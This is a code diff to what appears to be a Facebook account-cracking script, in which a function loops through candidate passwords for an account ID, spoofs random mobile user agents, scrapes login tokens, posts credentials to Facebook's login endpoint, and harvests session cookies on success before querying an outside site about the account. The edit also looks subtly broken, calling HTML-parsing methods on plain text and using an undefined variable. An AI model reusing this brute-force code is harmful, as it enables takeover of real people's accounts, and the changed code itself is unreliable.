@@ -1050,8 +1050,29 @@ def m1(ids,pwv):
     ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
     try:
         for pas in pwv:
-            free_fb = session.get('https://m.facebook.com/?locale2=en_GB').text
-            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
+            response = session.get('https://m.facebook.com/?locale2=en_GB').text
+            info={
+            'fb_dtsg': response.html.find('input[name="fb_dtsg"]', first=True).attrs.get('value', ''),
+            'lsd': response.html.find('input[name="lsd"]', first=True).attrs.get('value', ''),
+            'jazoest': response.html.find('input[name="jazoest"]', first=True).attrs.get('value', ''),
+            'login': response.html.find('input[name="login"]', first=True).attrs.get('value', ''),
+            'persistent': response.html.find('input[name="persistent"]', first=True).attrs.get('value', ''),
+            'email': ids,
+            'pass': pas,
+            'source': response.html.find('input[name="source"]', first=True).attrs.get('value', ''),
+            'm_ts': response.html.find('input[name="m_ts"]', first=True).attrs.get('value', ''),
+            'login_attempt': response.html.find('input[name="login_attempt"]', first=True).attrs.get('value', ''),
+            'timestamp': response.html.find('input[name="timestamp"]', first=True).attrs.get('value', ''),
+            'locale': response.html.find('input[name="locale"]', first=True).attrs.get('value', ''),
+            'next': response.html.find('input[name="next"]', first=True).attrs.get('value', ''),
+            'ref': response.html.find('input[name="ref"]', first=True).attrs.get('value', ''),
+            'dpr': response.html.find('input[name="dpr"]', first=True).attrs.get('value', ''),
+            'pl': response.html.find('input[name="pl"]', first=True).attrs.get('value', ''),
+            'id': response.html.find('input[name="id"]', first=True).attrs.get('value', ''),
+            'c_user': response.html.find('input[name="c_user"]', first=True).attrs.get('value', ''),
+            'xs': response.html.find('input[name="xs"]', first=True).attrs.get('value', ''),
+            'data': response.html.find('input[name="data"]', first=True).attrs.get('value', ''),
+            'legacy_id': response.html.find('input[name="legacy_id"]', first=True).attrs.get('value', '')}
             update={
             'Authority': 'm.facebook.com',
             'Accept': '*/*',
@@ -1076,9 +1097,8 @@ def m1(ids,pwv):
             'X-FB-LSD': 'AVq9MsDYu_k',
             'X-Requested-With': 'XMLHttpRequest',
             'X-Response-Format': 'JSONStream'}
-            session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=en_GB&refid=8',data=info,headers=update).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
+            login_response = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=en_GB&refid=8',data=info,headers=update).text
+            if 'c_user' in login_response.cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = re.findall('c_user=(.*);xs',coki)[0]
                 ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}"
